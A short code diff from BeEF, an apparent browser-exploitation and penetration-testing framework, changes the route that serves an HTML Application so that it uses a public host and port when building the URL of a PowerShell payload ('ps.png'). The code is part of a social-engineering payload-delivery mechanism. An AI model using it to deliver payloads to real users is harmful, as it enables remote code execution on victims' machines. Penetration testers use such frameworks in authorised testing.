@@ -28,9 +28,8 @@ module BeEF
         # serves the HTML Application (HTA)
         get '/hta' do
           response['Content-Type'] = "application/hta"
-
-          host = BeEF::Core::Configuration.instance.get('beef.http.host')
-          port = BeEF::Core::Configuration.instance.get('beef.http.port')
+          host = BeEF::Core::Configuration.instance.get('beef.http.public') || BeEF::Core::Configuration.instance.get('beef.http.host')
+          port = BeEF::Core::Configuration.instance.get('beef.http.public_port') || BeEF::Core::Configuration.instance.get('beef.http.port')
           ps_url = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.powershell_handler_url')
           payload_url = "http://#{host}:#{port}#{ps_url}/ps.png"
 
